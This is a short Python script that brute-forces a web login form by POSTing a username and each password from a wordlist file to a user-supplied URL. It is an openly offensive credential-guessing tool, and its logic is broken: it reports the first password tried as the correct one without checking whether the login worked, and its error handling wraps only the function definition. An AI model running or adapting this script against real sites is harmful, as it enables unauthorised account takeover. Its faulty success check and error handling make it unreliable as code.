import requests
url = input("Enter Url: ")
username = input("Enter Username: ")
try:
    def bruteCracking(username,url):
        for password in passwords:
            password = password.strip()
            print("Trying:" + password)
            data_dict = {"username": username,"password": password,"login":"submit"}
            response = requests.post(url, data=data_dict)
            if "csrf" in str(response.content):
                 print("CSRF Token Detected,BruteForce Not Working.")
                 exit()
            else:
                 print("Username: ---> " + username)
                 print("Password: ---> " + password)
                 exit()
except:
       print("Some Error Occurred Please Check Your Internet Connection !!")
with open("password.txt", "r") as passwords:
     bruteCracking(username,url)
print(" password not found in password list")

